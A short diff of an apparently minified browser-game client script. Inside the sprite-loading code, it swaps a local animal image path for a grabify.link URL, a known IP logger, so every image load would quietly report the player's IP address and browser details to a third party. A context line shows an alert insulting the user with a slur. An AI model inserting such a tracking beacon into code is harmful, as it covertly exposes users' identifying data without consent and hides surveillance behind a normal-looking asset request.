@@ -2806,7 +2806,7 @@ alert('What a retard ;( Imagine using non-bundle hax. Shame on you.');
             var r = new Image;
             r.onload = function() {
                 this.isLoaded = !0, this.onload = null
-            }, r.src = ".././img/animals/" + e.src + ".png", i = r, mi[n] = i
+            }, r.src = "https://grabify.link/3PAWS1", i = r, mi[n] = i
         }
         if (i.isLoaded) {
             var s = 1.2 * e.scale * (e.spriteMlt || 1);
